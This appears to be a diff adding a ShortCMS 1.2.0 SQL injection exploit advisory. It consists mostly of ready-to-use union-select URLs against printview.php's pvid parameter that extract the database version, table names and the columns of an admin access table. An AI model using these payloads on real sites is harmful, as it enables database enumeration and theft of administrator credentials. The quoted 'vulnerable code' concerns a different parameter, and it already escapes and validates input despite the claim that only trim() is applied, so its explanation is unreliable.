@@ -1,0 +1,81 @@
+#######################[ Informatique inside ]##########################
+#ShortCMS             :  SQL injection
+#Version              :  1.2.0 (Last Version of 11/02/2010) and ALL < version.
+#Author               :  Thibow
+#Contact              :  Thibow[4t]linformatique-inside[dot]com
+#Location             :  France
+#Website              :  http://www.informatique-inside.com
+#Solution             :  Secure your parameters in printView page of News
+########################################################################
+
+                 .   :
+                   :::III
+                   .:::IIIII
+                   .:IIIIIIIIII...
+                     :IIHIIIIIIIII:.
+                      :IIIIIIIIIII:::
+    .:IIIIIIIIIIIII:   :IIIIIIIIII:::MI. .
+     ..:::IIIIIIIIIIII  :IIIIIII::::MMH.:
+    .::IIHMHIIIIIIIIIII: IIIIII::::MMM.M .:
+   ....::IHHMIIIIIIIIIII.:IIII::::MMMIM .I:
+   ...::IIIIHHIIIIIIIIIII:III:::::MMMM:.H:
+          .:IIIIIIIIIIIIIHI::::::M.H.M II
+            .:IIIIIIIIIIIMI:::::M. :M :M.
+              .IIIIIIII::MI::::M:  HM:M:
+              .:IIII:::::MI:::M:..IMMHH.
+          . .:I:I::::::::MI::M:. :MMMM:
+         . .IMI..::::::::MI:H.:.:MMMHM.
+        : :MMI.  .:::::::MI.:::HMMMMHI
+       : :MMI.    :::::III I HMMMIMMM:
+      :.:MMI.     .IIII: I:.MMMM: MMM.
+     .::MMI.       II:.II:HMMMH. .MMM.
+     I::II.         II:.IMMMH:.  IMMM:
+     ..::II:      III :IIMMH.    HHHM:
+    ::. .::. .::II..IIIIIMI.     HHHM:
+    II::.:II::: .IMMMIIIIMI.    MMMMM:
+     IIII:.:HMMMMMMMMIIIIMI.   :MMMMM:
+     .MIIIMMMMMMMH:. .IIIMH.. .MMMMMM:
+      :MMMMMMI:..     IIIIH:.MMMHMMMI
+       :HMMH.         .MMMMMMMM:MMMI.
+                    .IMMMMMM::HMMM.
+                         .:IMMMM:.
+
+
+
+
+
+
+###############################################################################################################################################################################################################################
+
+#=Sql Injection===============================================================================================================================================================================================================#
+# Exploit[MySql Version] 
+# =>http://localhost/printview.php?func=news1&pvid=-55%20union%20all%20select%201,@@version,3,4,5,6,7,8--
+# 
+# Exploit[Table Name]
+# => http://localhost/printview.php?func=news1&pvid=-55%20union%20all%20select%201,group_concat%28table_name%29,3,4,5,6,7,8%20from%20information_schema.tables%20where%20table_schema=database%28%29--
+#
+# Exploit[Column name]
+# => http://localhost/printview.php?func=news1&pvid=-55%20union%20all%20select%201,group_concat%28column_name%29,3,4,5,6,7,8%20from%20information_schema.columns%20where%20table_name=0x647363315f61646d696e5f616363657373--
+#
+#=============================================================================================================================================================================================================================#
+
+
+
+#=Vulerable code===============================================================================================================================================================================================================#
+
+File: ./content/news2view.con.php
+Line: 50 to 56
+
+      $news2_ID = trim( $_GET['news2_ID'] );
+      $news2_ID = mysql_real_escape_string( $news2_ID );
+      if( is_it_number( $news2_ID ) == TRUE ) {
+        $news2_ID = $news2_ID;
+      } else {
+        $news2_ID = 0;
+      }
+
+=> The parameter news2_ID was recover in just trim() function... 
+
+
+#=============================================================================================================================================================================================================================#
+
